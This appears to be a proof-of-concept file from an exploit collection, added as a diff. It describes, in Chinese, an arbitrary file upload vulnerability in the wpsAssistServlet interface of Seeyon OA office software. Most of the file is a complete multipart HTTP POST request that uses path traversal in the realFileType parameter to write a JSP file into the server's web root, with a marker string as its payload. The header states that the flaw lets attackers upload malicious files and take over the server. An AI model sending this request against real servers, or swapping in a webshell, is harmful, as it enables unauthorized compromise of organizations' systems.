@@ -1,0 +1,16 @@
+# 致远OA_wpsAssistServlet任意文件上传漏洞
+# 致远OA是一套办公协同管理软件。致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限。
+POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2&acid=80000900&bid=hd_tag_m8mv25y5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25y5
+RM-PRO-Token: 153667c52f9ccdc4b1079b15094bcbf6
+RM-PRO-Time: 1742808513321
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+
+--59229605f98b8cf290a7b8908b34616b
+Content-Disposition: form-data; name="upload"; filename="123.xls"
+Content-Type: application/vnd.ms-excel
+
+<% out.println("seeyon_d3ksl4");%>
+--59229605f98b8cf290a7b8908b34616b--
